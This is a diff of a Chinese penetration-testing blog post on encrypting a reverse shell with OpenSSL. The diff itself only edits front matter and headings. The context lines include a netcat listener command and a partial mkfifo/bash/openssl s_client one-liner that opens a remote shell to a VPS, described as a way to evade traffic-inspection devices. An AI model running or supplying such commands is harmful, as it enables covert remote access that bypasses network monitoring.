@@ -1,18 +1,16 @@
 ---
 title: "Encrypt Reverse Shell"
 date: 2019-08-26T12:55:07+08:00
-lastmod: 2019-08-26T12:55:07+08:00
 draft: false
 tags: ['reverse','shell']
 categories: ['渗透测试']
-comment: true
 ---
 利用openssl加密你的shell
 <!--more-->
 
 在我们实际的渗透测试过程中，总是有各种各样的流量审查设备挡住我们通往system的道路，尤其是在反弹shell的时候，明文传输的shell总是容易断，那么本文介绍一种利用openssl反弹流量加密的shell来绕过流量审查设备。
 
-# 常规bash反弹
+## 常规bash反弹
 
 vps执行 `nc -lvvp 4444`
 
@@ -22,7 +20,7 @@ vps执行 `nc -lvvp 4444`
 
 流量明文传输，很容易被拦截。
 
-# openssl加密传输
+## openssl加密传输
 
 第一步，在vps上生成SSL证书的公钥/私钥对
 ```bash
@@ -41,7 +39,7 @@ mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1|openssl s_client -quiet -connect vps:44
 
 流量已经被加密。
 
-# 参考链接
+## 参考链接
 
 1. https://www.t00ls.net/articles-52477.html
 2. https://www.freebuf.com/vuls/211847.html
